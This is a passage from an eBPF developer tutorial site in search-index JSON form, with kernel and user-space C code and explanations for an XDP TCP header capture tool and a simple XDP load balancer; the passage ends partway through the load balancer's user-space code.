code that captures TCP header information.</p>"},{"location":"tutorials/41-xdp-tcpdump/#full-kernel-code","title":"Full Kernel Code","text":"<pre><code>#include \"vmlinux.h\"\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_endian.h&gt;\n\n#define ETH_P_IP 0x0800\n\n// Define the ring buffer map\nstruct {\n    __uint(type, BPF_MAP_TYPE_RINGBUF);\n    __uint(max_entries, 1 &lt;&lt; 24);  // 16 MB buffer\n} rb SEC(\".maps\");\n\n// Helper function to check if the packet is TCP\nstatic bool is_tcp(struct ethhdr *eth, void *data_end)\n{\n    // Ensure Ethernet header is within bounds\n    if ((void *)(eth + 1) &gt; data_end)\n        return false;\n\n    // Only handle IPv4 packets\n    if (bpf_ntohs(eth-&gt;h_proto) != ETH_P_IP)\n        return false;\n\n    struct iphdr *ip = (struct iphdr *)(eth + 1);\n\n    // Ensure IP header is within bounds\n    if ((void *)(ip + 1) &gt; data_end)\n        return false;\n\n    // Check if the protocol is TCP\n    if (ip-&gt;protocol != IPPROTO_TCP)\n        return false;\n\n    return true;\n}\n\nSEC(\"xdp\")\nint xdp_pass(struct xdp_md *ctx)\n{\n    // Pointers to packet data\n    void *data = (void *)(long)ctx-&gt;data;\n    void *data_end = (void *)(long)ctx-&gt;data_end;\n\n    // Parse Ethernet header\n    struct ethhdr *eth = data;\n\n    // Check if the packet is a TCP packet\n    if (!is_tcp(eth, data_end)) {\n        return XDP_PASS;\n    }\n\n    // Cast to IP header\n    struct iphdr *ip = (struct iphdr *)(eth + 1);\n\n    // Calculate IP header length\n    int ip_hdr_len = ip-&gt;ihl * 4;\n    if (ip_hdr_len &lt; sizeof(struct iphdr)) {\n        return XDP_PASS;\n    }\n\n    // Ensure IP header is within packet bounds\n    if ((void *)ip + ip_hdr_len &gt; data_end) {\n        return XDP_PASS;\n    }\n\n    // Parse TCP header\n    struct tcphdr *tcp = (struct tcphdr *)((unsigned char *)ip + ip_hdr_len);\n\n    // Ensure TCP header is within packet bounds\n    if ((void *)(tcp + 1) &gt; data_end) {\n        return XDP_PASS;\n    }\n\n    // Define the number of bytes you want to capture from the TCP header\n    const int tcp_header_bytes = 32;\n\n    // Ensure that the desired number of bytes does not exceed packet bounds\n    if ((void *)tcp + tcp_header_bytes &gt; data_end) {\n        return XDP_PASS;\n    }\n\n    // Reserve space in the ring buffer\n    void *ringbuf_space = bpf_ringbuf_reserve(&amp;rb, tcp_header_bytes, 0);\n    if (!ringbuf_space) {\n        return XDP_PASS;  // If reservation fails, skip processing\n    }\n\n    // Copy the TCP header bytes into the ring buffer\n    // Using a loop to ensure compliance with eBPF verifier\n    for (int i = 0; i &lt; tcp_header_bytes; i++) {\n        unsigned char byte = *((unsigned char *)tcp + i);\n        ((unsigned char *)ringbuf_space)[i] = byte;\n    }\n\n    // Submit the data to the ring buffer\n    bpf_ringbuf_submit(ringbuf_space, 0);\n\n    // Optional: Print a debug message\n    bpf_printk(\"Captured TCP header (%d bytes)\", tcp_header_bytes);\n\n    return XDP_PASS;\n}\n\nchar __license[] SEC(\"license\") = \"GPL\";\n</code></pre>"},{"location":"tutorials/41-xdp-tcpdump/#code-explanation","title":"Code Explanation","text":""},{"location":"tutorials/41-xdp-tcpdump/#defining-the-ring-buffer-map","title":"Defining the Ring Buffer Map","text":"<p>We define a ring buffer map named <code>rb</code> to pass data from the kernel to user space efficiently.</p> <pre><code>struct {\n    __uint(type, BPF_MAP_TYPE_RINGBUF);\n    __uint(max_entries, 1 &lt;&lt; 24);  // 16 MB buffer\n} rb SEC(\".maps\");\n</code></pre>"},{"location":"tutorials/41-xdp-tcpdump/#packet-parsing-and-validation","title":"Packet Parsing and Validation","text":"<p>The <code>is_tcp</code> helper function checks whether the incoming packet is a TCP packet by verifying the Ethernet and IP headers.</p> <pre><code>static bool is_tcp(struct ethhdr *eth, void *data_end)\n{\n    // ... (checks omitted for brevity)\n}\n</code></pre>"},{"location":"tutorials/41-xdp-tcpdump/#capturing-tcp-header-information","title":"Capturing TCP Header Information","text":"<p>In the <code>xdp_pass</code> function, we:</p> <ol> <li>Parse the Ethernet, IP, and TCP headers.</li> <li>Ensure all headers are within the packet bounds to prevent invalid memory access.</li> <li>Reserve space in the ring buffer to store the TCP header.</li> <li>Copy the TCP header bytes into the ring buffer.</li> <li>Submit the data to the ring buffer for user-space consumption.</li> </ol> <pre><code>// Reserve space in the ring buffer\nvoid *ringbuf_space = bpf_ringbuf_reserve(&amp;rb, tcp_header_bytes, 0);\nif (!ringbuf_space) {\n    return XDP_PASS;\n}\n\n// Copy the TCP header bytes\nfor (int i = 0; i &lt; tcp_header_bytes; i++) {\n    unsigned char byte = *((unsigned char *)tcp + i);\n    ((unsigned char *)ringbuf_space)[i] = byte;\n}\n\n// Submit to ring buffer\nbpf_ringbuf_submit(ringbuf_space, 0);\n</code></pre>"},{"location":"tutorials/41-xdp-tcpdump/#using-bpf_printk-for-debugging","title":"Using bpf_printk for Debugging","text":"<p>The <code>bpf_printk</code> function logs messages to the kernel's trace pipe, which can be invaluable for debugging.</p> <pre><code>bpf_printk(\"Captured TCP header (%d bytes)\", tcp_header_bytes);\n</code></pre>"},{"location":"tutorials/41-xdp-tcpdump/#user-space-code-analysis","title":"User-Space Code Analysis","text":"<p>Let's examine the user-space program that reads the captured TCP headers from the ring buffer and displays them.</p>"},{"location":"tutorials/41-xdp-tcpdump/#full-user-space-code","title":"Full User-Space Code","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;errno.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;net/if.h&gt;\n\n#include &lt;bpf/libbpf.h&gt;\n#include &lt;bpf/bpf.h&gt;\n\n#include \"xdp-tcpdump.skel.h\"  // Generated skeleton header\n\n// Callback function to handle events from the ring buffer\nstatic int handle_event(void *ctx, void *data, size_t data_sz)\n{\n    if (data_sz &lt; 20) {  // Minimum TCP header size\n        fprintf(stderr, \"Received incomplete TCP header\\n\");\n        return 0;\n    }\n\n    // Parse the raw TCP header bytes\n    struct tcphdr {\n        uint16_t source;\n        uint16_t dest;\n        uint32_t seq;\n        uint32_t ack_seq;\n        uint16_t res1:4,\n                 doff:4,\n                 fin:1,\n                 syn:1,\n                 rst:1,\n                 psh:1,\n                 ack:1,\n                 urg:1,\n                 ece:1,\n                 cwr:1;\n        uint16_t window;\n        uint16_t check;\n        uint16_t urg_ptr;\n        // Options and padding may follow\n    } __attribute__((packed));\n\n    if (data_sz &lt; sizeof(struct tcphdr)) {\n        fprintf(stderr, \"Data size (%zu) less than TCP header size\\n\", data_sz);\n        return 0;\n    }\n\n    struct tcphdr *tcp = (struct tcphdr *)data;\n\n    // Convert fields from network byte order to host byte order\n    uint16_t source_port = ntohs(tcp-&gt;source);\n    uint16_t dest_port = ntohs(tcp-&gt;dest);\n    uint32_t seq = ntohl(tcp-&gt;seq);\n    uint32_t ack_seq = ntohl(tcp-&gt;ack_seq);\n    uint16_t window = ntohs(tcp-&gt;window);\n\n    // Extract flags\n    uint8_t flags = 0;\n    flags |= (tcp-&gt;fin) ? 0x01 : 0x00;\n    flags |= (tcp-&gt;syn) ? 0x02 : 0x00;\n    flags |= (tcp-&gt;rst) ? 0x04 : 0x00;\n    flags |= (tcp-&gt;psh) ? 0x08 : 0x00;\n    flags |= (tcp-&gt;ack) ? 0x10 : 0x00;\n    flags |= (tcp-&gt;urg) ? 0x20 : 0x00;\n    flags |= (tcp-&gt;ece) ? 0x40 : 0x00;\n    flags |= (tcp-&gt;cwr) ? 0x80 : 0x00;\n\n    printf(\"Captured TCP Header:\\n\");\n    printf(\"  Source Port: %u\\n\", source_port);\n    printf(\"  Destination Port: %u\\n\", dest_port);\n    printf(\"  Sequence Number: %u\\n\", seq);\n    printf(\"  Acknowledgment Number: %u\\n\", ack_seq);\n    printf(\"  Data Offset: %u\\n\", tcp-&gt;doff);\n    printf(\"  Flags: 0x%02x\\n\", flags);\n    printf(\"  Window Size: %u\\n\", window);\n    printf(\"\\n\");\n\n    return 0;\n}\n\nint main(int argc, char **argv)\n{\n    struct xdp_tcpdump_bpf *skel;\n    struct ring_buffer *rb = NULL;\n    int ifindex;\n    int err;\n\n    if (argc != 2)\n    {\n        fprintf(stderr, \"Usage: %s &lt;ifname&gt;\\n\", argv[0]);\n        return 1;\n    }\n\n    const char *ifname = argv[1];\n    ifindex = if_nametoindex(ifname);\n    if (ifindex == 0)\n    {\n        fprintf(stderr, \"Invalid interface name %s\\n\", ifname);\n        return 1;\n    }\n\n    /* Open and load BPF application */\n    skel = xdp_tcpdump_bpf__open();\n    if (!skel)\n    {\n        fprintf(stderr, \"Failed to open BPF skeleton\\n\");\n        return 1;\n    }\n\n    /* Load &amp; verify BPF programs */\n    err = xdp_tcpdump_bpf__load(skel);\n    if (err)\n    {\n        fprintf(stderr, \"Failed to load and verify BPF skeleton: %d\\n\", err);\n        goto cleanup;\n    }\n\n    /* Attach XDP program */\n    err = xdp_tcpdump_bpf__attach(skel);\n    if (err)\n    {\n        fprintf(stderr, \"Failed to attach BPF skeleton: %d\\n\", err);\n        goto cleanup;\n    }\n\n    /* Attach the XDP program to the specified interface */\n    skel-&gt;links.xdp_pass = bpf_program__attach_xdp(skel-&gt;progs.xdp_pass, ifindex);\n    if (!skel-&gt;links.xdp_pass)\n    {\n        err = -errno;\n        fprintf(stderr, \"Failed to attach XDP program: %s\\n\", strerror(errno));\n        goto cleanup;\n    }\n\n    printf(\"Successfully attached XDP program to interface %s\\n\", ifname);\n\n    /* Set up ring buffer polling */\n    rb = ring_buffer__new(bpf_map__fd(skel-&gt;maps.rb), handle_event, NULL, NULL);\n    if (!rb)\n    {\n        fprintf(stderr, \"Failed to create ring buffer\\n\");\n        err = -1;\n        goto cleanup;\n    }\n\n    printf(\"Start polling ring buffer\\n\");\n\n    /* Poll the ring buffer */\n    while (1)\n    {\n        err = ring_buffer__poll(rb, -1);\n        if (err == -EINTR)\n            continue;\n        if (err &lt; 0)\n        {\n            fprintf(stderr, \"Error polling ring buffer: %d\\n\", err);\n            break;\n        }\n    }\n\ncleanup:\n    ring_buffer__free(rb);\n    xdp_tcpdump_bpf__destroy(skel);\n    return -err;\n}\n</code></pre>"},{"location":"tutorials/41-xdp-tcpdump/#code-explanation_1","title":"Code Explanation","text":""},{"location":"tutorials/41-xdp-tcpdump/#handling-ring-buffer-events","title":"Handling Ring Buffer Events","text":"<p>The <code>handle_event</code> function processes TCP header data received from the ring buffer.</p> <pre><code>static int handle_event(void *ctx, void *data, size_t data_sz)\n{\n    // Validate data size\n    if (data_sz &lt; 20) {\n        fprintf(stderr, \"Received incomplete TCP header\\n\");\n        return 0;\n    }\n\n    // Parse the TCP header\n    // ... (parsing code)\n}\n</code></pre>"},{"location":"tutorials/41-xdp-tcpdump/#parsing-the-tcp-header","title":"Parsing the TCP Header","text":"<p>We define a local <code>tcphdr</code> structure to interpret the raw bytes.</p> <pre><code>struct tcphdr {\n    uint16_t source;\n    uint16_t dest;\n    uint32_t seq;\n    uint32_t ack_seq;\n    // ... (other fields)\n} __attribute__((packed));\n</code></pre>"},{"location":"tutorials/41-xdp-tcpdump/#displaying-captured-information","title":"Displaying Captured Information","text":"<p>After parsing, we print the TCP header fields in a readable format.</p> <pre><code>printf(\"Captured TCP Header:\\n\");\nprintf(\"  Source Port: %u\\n\", source_port);\nprintf(\"  Destination Port: %u\\n\", dest_port);\n// ... (other fields)\n</code></pre>"},{"location":"tutorials/41-xdp-tcpdump/#setting-up-the-ebpf-skeleton","title":"Setting Up the eBPF Skeleton","text":"<p>We use the generated skeleton <code>xdp-tcpdump.skel.h</code> to load and attach the eBPF program.</p> <pre><code>/* Open and load BPF application */\nskel = xdp_tcpdump_bpf__open();\nif (!skel) {\n    fprintf(stderr, \"Failed to open BPF skeleton\\n\");\n    return 1;\n}\n\n/* Load &amp; verify BPF programs */\nerr = xdp_tcpdump_bpf__load(skel);\nif (err) {\n    fprintf(stderr, \"Failed to load and verify BPF skeleton: %d\\n\", err);\n    goto cleanup;\n}\n</code></pre>"},{"location":"tutorials/41-xdp-tcpdump/#attaching-to-the-network-interface","title":"Attaching to the Network Interface","text":"<p>We attach the XDP program to the specified network interface by name.</p> <pre><code>skel-&gt;links.xdp_pass = bpf_program__attach_xdp(skel-&gt;progs.xdp_pass, ifindex);\nif (!skel-&gt;links.xdp_pass) {\n    err = -errno;\n    fprintf(stderr, \"Failed to attach XDP program: %s\\n\", strerror(errno));\n    goto cleanup;\n}\n</code></pre>"},{"location":"tutorials/41-xdp-tcpdump/#compilation-and-execution-instructions","title":"Compilation and Execution Instructions","text":""},{"location":"tutorials/41-xdp-tcpdump/#prerequisites","title":"Prerequisites","text":"<ul> <li>A Linux system with a kernel version that supports eBPF and XDP.</li> <li>libbpf library installed.</li> <li>Compiler with eBPF support (clang).</li> </ul>"},{"location":"tutorials/41-xdp-tcpdump/#building-the-program","title":"Building the Program","text":"<p>Assuming you have cloned the repository from GitHub, navigate to the <code>bpf-developer-tutorial/src/41-xdp-tcpdump</code> directory.</p> <pre><code>cd bpf-developer-tutorial/src/41-xdp-tcpdump\nmake\n</code></pre> <p>This command compiles both the kernel eBPF code and the user-space application.</p>"},{"location":"tutorials/41-xdp-tcpdump/#running-the-program","title":"Running the Program","text":"<p>First, identify your network interfaces:</p> <pre><code>ifconfig\n</code></pre> <p>Sample output:</p> <pre><code>wlp0s20f3: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 192.168.1.10  netmask 255.255.255.0  broadcast 192.168.1.255\n        ether 00:1a:2b:3c:4d:5e  txqueuelen 1000  (Ethernet)\n</code></pre> <p>Run the user-space program with the desired network interface:</p> <pre><code>sudo ./xdp-tcpdump wlp0s20f3\n</code></pre> <p>Sample output:</p> <pre><code>Successfully attached XDP program to interface wlp0s20f3\nStart polling ring buffer\nCaptured TCP Header:\n  Source Port: 443\n  Destination Port: 53500\n  Sequence Number: 572012449\n  Acknowledgment Number: 380198588\n  Data Offset: 8\n  Flags: 0x10\n  Window Size: 16380\n</code></pre>"},{"location":"tutorials/41-xdp-tcpdump/#complete-source-code-and-resources","title":"Complete Source Code and Resources","text":"<ul> <li>Source Code Repository: GitHub - bpf-developer-tutorial</li> <li>Tutorial Website: eunomia.dev Tutorials</li> </ul>"},{"location":"tutorials/41-xdp-tcpdump/#summary-and-conclusion","title":"Summary and Conclusion","text":"<p>In this tutorial, we explored how to use eBPF and XDP to capture TCP header information directly within the Linux kernel. By analyzing both the kernel eBPF code and the user-space application, we learned how to intercept packets, extract essential TCP fields, and communicate this data to user space efficiently using a ring buffer.</p> <p>This approach offers a high-performance alternative to traditional packet capturing methods, with minimal impact on system resources. It's a powerful technique for network monitoring, security analysis, and debugging.</p> <p>If you would like to learn more about eBPF, visit our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial or our website at https://eunomia.dev/tutorials/.</p> <p>Happy coding!</p> <p>Share on  Share on </p>"},{"location":"tutorials/42-xdp-loadbalancer/","title":"eBPF Developer Tutorial: XDP Load Balancer","text":"<p>In this tutorial, we will guide you through the process of implementing a simple XDP (eXpress Data Path) load balancer using eBPF (Extended Berkeley Packet Filter). With just C, libbpf, and no external dependencies, this hands-on guide is perfect for developers interested in harnessing the full power of the Linux kernel to build highly efficient network applications.</p>"},{"location":"tutorials/42-xdp-loadbalancer/#why-xdp","title":"Why XDP?","text":"<p><code>XDP</code> (eXpress Data Path) is a fast, in-kernel networking framework in Linux that allows packet processing at the earliest point in the network stack, right in the network interface card (NIC). This enables ultra-low-latency and high-throughput packet handling, making XDP ideal for tasks like load balancing, DDoS protection, and traffic filtering.</p> <p>Key Features of XDP</p> <ol> <li>Fast Packet Processing: XDP handles packets directly at the NIC level, reducing latency and improving performance by avoiding the usual networking stack overhead.</li> <li>Efficient: Because it processes packets before they reach the kernel, XDP minimizes CPU usage and handles high traffic loads without slowing down the system.</li> <li>Customizable with eBPF: XDP programs are written using eBPF, allowing you to create custom packet-handling logic for specific use cases like dropping, redirecting, or forwarding packets.</li> <li>Low CPU Overhead: With support for zero-copy packet forwarding, XDP uses fewer system resources, making it perfect for handling high traffic with minimal CPU load.</li> <li>Simple Actions: XDP programs return predefined actions like dropping, passing, or redirecting packets, providing control over how traffic is handled.</li> </ol> <p>Projects That Use XDP</p> <ul> <li><code>Cilium</code> is an open-source networking tool for cloud-native environments like Kubernetes. It uses XDP to efficiently handle packet filtering and load balancing, improving performance in high-traffic networks.</li> <li><code>Katran</code>, developed by Facebook, is a load balancer that uses XDP to handle millions of connections with low CPU usage. It distributes traffic efficiently across servers and is used internally at Facebook for large-scale networking.</li> <li><code>Cloudflare</code> uses XDP to protect against DDoS attacks. By filtering out malicious traffic at the NIC level, Cloudflare can drop attack packets before they even reach the kernel, minimizing the impact on their network.</li> </ul>"},{"location":"tutorials/42-xdp-loadbalancer/#why-choose-xdp-over-other-methods","title":"Why Choose XDP Over Other Methods?","text":"<p>Compared to traditional tools like <code>iptables</code> or <code>tc</code>, XDP offers:</p> <ul> <li>Speed: It operates directly in the NIC driver, processing packets much faster than traditional methods.</li> <li>Flexibility: With eBPF, you can write custom packet-handling logic to meet specific needs.</li> <li>Efficiency: XDP uses fewer resources, making it suitable for environments that need to handle high traffic without overloading the system.</li> </ul>"},{"location":"tutorials/42-xdp-loadbalancer/#the-project-building-a-simple-load-balancer","title":"The Project: Building a Simple Load Balancer","text":"<p>In this project, we will be focusing on building a load balancer using XDP. A load balancer efficiently distributes incoming network traffic across multiple backend servers to prevent any single server from becoming overwhelmed. With the combination of XDP and eBPF, we can build a load balancer that operates at the edge of the Linux networking stack, ensuring high performance even under heavy traffic conditions.</p> <p>The load balancer we\u2019ll be implementing will:</p> <ul> <li>Listen for incoming network packets.</li> <li>Calculate a hash based on the packet's source IP and port, allowing us to distribute the traffic across multiple backend servers.</li> <li>Forward the packet to the appropriate backend server based on the calculated hash.</li> </ul> <p>We'll keep the design simple but powerful, showing you how to leverage eBPF\u2019s capabilities to create a lightweight load balancing solution.</p>"},{"location":"tutorials/42-xdp-loadbalancer/#kernel-ebpf-code","title":"kernel eBPF code","text":"<pre><code>// xdp_lb.bpf.c\n#include &lt;bpf/bpf_endian.h&gt;\n#include &lt;linux/bpf.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;linux/if_ether.h&gt;\n#include &lt;linux/ip.h&gt;\n#include &lt;linux/in.h&gt;\n#include &lt;linux/tcp.h&gt;\n#include \"xx_hash.h\"\n\nstruct backend_config {\n    __u32 ip;\n    unsigned char mac[ETH_ALEN];\n};\n\n// Backend IP and MAC address map\nstruct {\n    __uint(type, BPF_MAP_TYPE_ARRAY);\n    __uint(max_entries, 2);  // Two backends\n    __type(key, __u32);\n    __type(value, struct backend_config);\n} backends SEC(\".maps\");\n\nint client_ip = bpf_htonl(0xa000001);  \nunsigned char client_mac[ETH_ALEN] = {0xDE, 0xAD, 0xBE, 0xEF, 0x0, 0x1};\nint load_balancer_ip = bpf_htonl(0xa00000a);\nunsigned char load_balancer_mac[ETH_ALEN] = {0xDE, 0xAD, 0xBE, 0xEF, 0x0, 0x10};\n\nstatic __always_inline __u16\ncsum_fold_helper(__u64 csum)\n{\n    int i;\n    for (i = 0; i &lt; 4; i++)\n    {\n        if (csum &gt;&gt; 16)\n            csum = (csum &amp; 0xffff) + (csum &gt;&gt; 16);\n    }\n    return ~csum;\n}\n\nstatic __always_inline __u16\niph_csum(struct iphdr *iph)\n{\n    iph-&gt;check = 0;\n    unsigned long long csum = bpf_csum_diff(0, 0, (unsigned int *)iph, sizeof(struct iphdr), 0);\n    return csum_fold_helper(csum);\n}\n\nSEC(\"xdp\")\nint xdp_load_balancer(struct xdp_md *ctx) {\n    void *data_end = (void *)(long)ctx-&gt;data_end;\n    void *data = (void *)(long)ctx-&gt;data;\n\n    bpf_printk(\"xdp_load_balancer received packet\");\n\n    // Ethernet header\n    struct ethhdr *eth = data;\n    if ((void *)(eth + 1) &gt; data_end)\n        return XDP_PASS;\n\n    // Check if the packet is IP (IPv4)\n    if (eth-&gt;h_proto != __constant_htons(ETH_P_IP))\n        return XDP_PASS;\n\n    // IP header\n    struct iphdr *iph = (struct iphdr *)(eth + 1);\n    if ((void *)(iph + 1) &gt; data_end)\n        return XDP_PASS;\n\n    // Check if the protocol is TCP or UDP\n    if (iph-&gt;protocol != IPPROTO_TCP)\n        return XDP_PASS;\n\n    bpf_printk(\"Received Source IP: 0x%x\", bpf_ntohl(iph-&gt;saddr));\n    bpf_printk(\"Received Destination IP: 0x%x\", bpf_ntohl(iph-&gt;daddr));\n    bpf_printk(\"Received Source MAC: %x:%x:%x:%x:%x:%x\", eth-&gt;h_source[0], eth-&gt;h_source[1], eth-&gt;h_source[2], eth-&gt;h_source[3], eth-&gt;h_source[4], eth-&gt;h_source[5]);\n    bpf_printk(\"Received Destination MAC: %x:%x:%x:%x:%x:%x\", eth-&gt;h_dest[0], eth-&gt;h_dest[1], eth-&gt;h_dest[2], eth-&gt;h_dest[3], eth-&gt;h_dest[4], eth-&gt;h_dest[5]);\n\n    if (iph-&gt;saddr == client_ip)\n    {\n        bpf_printk(\"Packet from client\");\n\n        __u32 key = xxhash32((const char*)iph, sizeof(struct iphdr), 0) % 2;\n\n        struct backend_config *backend = bpf_map_lookup_elem(&amp;backends, &amp;key);\n        if (!backend)\n            return XDP_PASS;\n\n        iph-&gt;daddr = backend-&gt;ip;\n        __builtin_memcpy(eth-&gt;h_dest, backend-&gt;mac, ETH_ALEN);\n    }\n    else\n    {\n        bpf_printk(\"Packet from backend\");\n        iph-&gt;daddr = client_ip;\n        __builtin_memcpy(eth-&gt;h_dest, client_mac, ETH_ALEN);\n    }\n\n    // Update IP source address to the load balancer's IP\n    iph-&gt;saddr = load_balancer_ip;\n    // Update Ethernet source MAC address to the current lb's MAC\n    __builtin_memcpy(eth-&gt;h_source, load_balancer_mac, ETH_ALEN);\n\n    // Recalculate IP checksum\n    iph-&gt;check = iph_csum(iph);\n\n    bpf_printk(\"Redirecting packet to new IP 0x%x from IP 0x%x\", \n                bpf_ntohl(iph-&gt;daddr), \n                bpf_ntohl(iph-&gt;saddr)\n            );\n    bpf_printk(\"New Dest MAC: %x:%x:%x:%x:%x:%x\", eth-&gt;h_dest[0], eth-&gt;h_dest[1], eth-&gt;h_dest[2], eth-&gt;h_dest[3], eth-&gt;h_dest[4], eth-&gt;h_dest[5]);\n    bpf_printk(\"New Source MAC: %x:%x:%x:%x:%x:%x\\n\", eth-&gt;h_source[0], eth-&gt;h_source[1], eth-&gt;h_source[2], eth-&gt;h_source[3], eth-&gt;h_source[4], eth-&gt;h_source[5]);\n    // Return XDP_TX to transmit the modified packet back to the network\n    return XDP_TX;\n}\n\nchar _license[] SEC(\"license\") = \"GPL\";\n</code></pre> <p>Here\u2019s a breakdown of the key sections of the kernel code for your blog:</p>"},{"location":"tutorials/42-xdp-loadbalancer/#1-header-files-and-data-structures","title":"1. Header Files and Data Structures","text":"<p>The code begins with necessary header files like <code>&lt;bpf/bpf_helpers.h&gt;</code>, <code>&lt;linux/if_ether.h&gt;</code>, <code>&lt;linux/ip.h&gt;</code>, and more. These headers provide definitions for handling Ethernet frames, IP packets, and BPF helper functions.</p> <p>The <code>backend_config</code> struct is defined to hold the IP and MAC address of backend servers. This will later be used for routing packets based on load balancing logic.</p> <pre><code>struct backend_config {\n    __u32 ip;\n    unsigned char mac[ETH_ALEN];\n};\n</code></pre>"},{"location":"tutorials/42-xdp-loadbalancer/#2-backend-and-load-balancer-configuration","title":"2. Backend and Load Balancer Configuration","text":"<p>The code defines an eBPF map named <code>backends</code> that stores IP and MAC addresses for two backends. The <code>BPF_MAP_TYPE_ARRAY</code> type is used to store backend configuration, with <code>max_entries</code> set to 2, indicating the load balancer will route to two backend servers.</p> <pre><code>struct {\n    __uint(type, BPF_MAP_TYPE_ARRAY);\n    __uint(max_entries, 2);\n    __type(key, __u32);\n    __type(value, struct backend_config);\n} backends SEC(\".maps\");\n</code></pre> <p>There are also predefined IP addresses and MAC addresses for the client and load balancer:</p> <pre><code>int client_ip = bpf_htonl(0xa000001);  \nunsigned char client_mac[ETH_ALEN] = {0xDE, 0xAD, 0xBE, 0xEF, 0x0, 0x1};\nint load_balancer_ip = bpf_htonl(0xa00000a);\nunsigned char load_balancer_mac[ETH_ALEN] = {0xDE, 0xAD, 0xBE, 0xEF, 0x0, 0x10};\n</code></pre>"},{"location":"tutorials/42-xdp-loadbalancer/#3-checksum-functions","title":"3. Checksum Functions","text":"<p>The function <code>iph_csum()</code> recalculates the IP header checksum after modifying the packet's contents. It's essential to keep the integrity of IP packets when any modification is done to the headers.</p> <pre><code>static __always_inline __u16 iph_csum(struct iphdr *iph) {\n    iph-&gt;check = 0;\n    unsigned long long csum = bpf_csum_diff(0, 0, (unsigned int *)iph, sizeof(struct iphdr), 0);\n    return csum_fold_helper(csum);\n}\n</code></pre>"},{"location":"tutorials/42-xdp-loadbalancer/#4-xdp-program-logic","title":"4. XDP Program Logic","text":"<p>The core of the XDP load balancer logic is implemented in the <code>xdp_load_balancer</code> function, which is attached to the XDP hook. It processes incoming packets and directs them either to a backend or back to the client.</p> <ul> <li>Initial Checks:   The function begins by verifying that the packet is an Ethernet frame, then checks if it's an IP packet (IPv4) and if it's using the TCP protocol.</li> </ul> <pre><code>if (eth-&gt;h_proto != __constant_htons(ETH_P_IP))\n    return XDP_PASS;\nif (iph-&gt;protocol != IPPROTO_TCP)\n    return XDP_PASS;\n</code></pre> <ul> <li>Client Packet Handling:   If the source IP matches the client IP, the code hashes the IP header using <code>xxhash32</code> to determine the appropriate backend (based on the key modulo 2).</li> </ul> <pre><code>if (iph-&gt;saddr == client_ip) {\n    __u32 key = xxhash32((const char*)iph, sizeof(struct iphdr), 0) % 2;\n    struct backend_config *backend = bpf_map_lookup_elem(&amp;backends, &amp;key);\n</code></pre> <p>The destination IP and MAC are replaced with those of the selected backend, and the packet is forwarded to the backend.</p> <ul> <li>Backend Packet Handling:   If the packet is from a backend server, the destination is set to the client\u2019s IP and MAC address, ensuring that the backend\u2019s response is directed back to the client.</li> </ul> <pre><code>iph-&gt;daddr = client_ip;\n__builtin_memcpy(eth-&gt;h_dest, client_mac, ETH_ALEN);\n</code></pre> <ul> <li>Rewriting IP and MAC Addresses:   The source IP and MAC are updated to the load balancer\u2019s values for all outgoing packets, ensuring that the load balancer appears as the source for both client-to-backend and backend-to-client communication.</li> </ul> <pre><code>iph-&gt;saddr = load_balancer_ip;\n__builtin_memcpy(eth-&gt;h_source, load_balancer_mac, ETH_ALEN);\n</code></pre> <ul> <li>Recalculate Checksum:   After modifying the IP header, the checksum is recalculated using the previously defined <code>iph_csum()</code> function.</li> </ul> <pre><code>iph-&gt;check = iph_csum(iph);\n</code></pre> <ul> <li>Final Action:   The packet is transmitted using the <code>XDP_TX</code> action, which instructs the NIC to send the modified packet.</li> </ul> <pre><code>return XDP_TX;\n</code></pre>"},{"location":"tutorials/42-xdp-loadbalancer/#5-conclusion","title":"5. Conclusion","text":"<p>This part of the blog could explain how the load balancer ensures traffic is efficiently routed between the client and two backend servers by inspecting the source IP, hashing it for load distribution, and modifying the destination IP and MAC before forwarding the packet. The <code>XDP_TX</code> action is key to the high-speed packet handling provided by eBPF in the XDP layer.</p> <p>This explanation can help readers understand the flow of the packet and the role of each section of the code in managing load balancing across multiple backends.</p>"},{"location":"tutorials/42-xdp-loadbalancer/#userspace-code","title":"Userspace code","text":"<pre><code>// xdp_lb.c\n#include &lt;arpa/inet.h&gt;\n#include &lt;bpf/bpf.h&gt;\n#include &lt;bpf/libbpf.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;net/if.h&gt;\n#include \"xdp_lb.skel.h\"  // The generated skeleton\n\nstruct backend_config {\n    __u32 ip;\n    unsigned char mac[6];\n};\n\nstatic int parse_mac(const char *str, unsigned char *mac) {\n    if (sscanf(str, \"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx\",\n               &amp;mac[0], &amp;mac[1], &amp;mac[2], &amp;mac[3], &amp;mac[4], &amp;mac[5]) != 6) {\n        fprintf(stderr, \"Invalid MAC address format\\n\");\n        return -1;\n    }\n    return 0;\n}\n\nint main(int argc, char **argv) {\n    if (argc != 6) {\n        fprintf(stderr, \"Usage: %s &lt;ifname&gt; &lt;backend1_ip&gt; &lt;backend1_mac&gt; &lt;backend2_ip&gt; &lt;backend2_mac&gt;\\n\", argv[0]);\n        return 1;\n    }\n\n    const char *ifname = argv[1];\n    struct backend_config backend[2];\n\n    // Parse backend 1\n    if (inet_pton(AF_INET, argv[2], &amp;backend[0].ip) != 1) {\n        fprintf(stderr, \"Invalid backend 1 IP address\\n\");\n        return 1;\n    }\n    if (parse_mac(argv[3], backend[0].mac) &lt; 0) {\n        return 1;\n    }\n\n    // Parse backend 2\n    if (inet_pton(AF_INET, argv[4], &amp;backend[1].ip) != 1) {\n        fprintf(stderr, \"Invalid backend 2 IP address\\n\");\n        return 1;\n    }\n    if (parse_mac(argv[5], backend[1].mac) &lt; 0) {\n        return 1;\n    }\n\n    // Load and attach the BPF program\n    struct xdp_lb_bpf *skel = xdp_lb_bpf__open_and_load();\n    if (!skel) {\n        fprintf(stderr, \"Failed to open and load BPF skeleton\\n\");\n        return 1;\n    }\n\n    int ifindex = if_nametoindex(ifname);\n    if (ifindex &lt; 0) {\n        perror(\"if_nametoindex\");\n        xdp_lb_bpf__destroy(skel);\n        return 1;\n    }\n\n    if (bpf_program__attach_xdp(skel-&gt;progs.xdp_load_balancer, ifindex) 